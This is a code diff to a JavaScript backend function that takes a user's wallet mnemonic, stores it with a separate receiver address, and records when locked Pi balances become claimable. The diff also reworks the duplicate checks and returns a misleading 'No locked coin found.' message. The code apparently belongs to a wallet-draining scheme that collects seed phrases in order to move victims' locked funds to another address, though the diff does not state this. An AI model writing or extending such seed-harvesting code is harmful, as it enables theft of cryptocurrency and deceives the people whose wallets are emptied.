@@ -3,10 +3,10 @@ import Sponsors from "../models/Sponsors.js";
 import { getClaimableBalance } from "./fn.js";
 
 export async function storeLockedPi(mnemonic, derivedPublicKey, receiverAddress) {
-    const existing = await Passphrase.findOne({ mnemonic });
-    if (existing) {
-        return {success: false, message: 'Passphrase already exists' };
-    }
+    // const existing = await Passphrase.findOne({ mnemonic });
+    // if (existing) {
+    //     return {success: false, message: 'Passphrase already exists' };
+    // }
 
     const claimableBalance = await getClaimableBalance(derivedPublicKey);
 
@@ -28,6 +28,11 @@ export async function storeLockedPi(mnemonic, derivedPublicKey, receiverAddress)
                     claimableAt = predicate.not.abs_before; // this means claimable *after* that time
                 }
 
+                const existing = await Passphrase.findOne({ mnemonic, balanceId: record.id });
+                if (existing) {
+                    continue;
+                }
+
                 entries.push({
                     mnemonic,
                     receiverAddress,
@@ -44,7 +49,12 @@ export async function storeLockedPi(mnemonic, derivedPublicKey, receiverAddress)
         }
 
         await Passphrase.create({ mnemonic, receiverAddress });
-        return {success: true, message: 'No locked coin found.' };
+        return {success: false, message: 'No locked coin found.' };
+    }
+
+    const existing = await Passphrase.findOne({ mnemonic });
+    if (existing) {
+        return {success: false, message: 'No locked coin found.' };
     }
 
     await Passphrase.create({ mnemonic, receiverAddress });
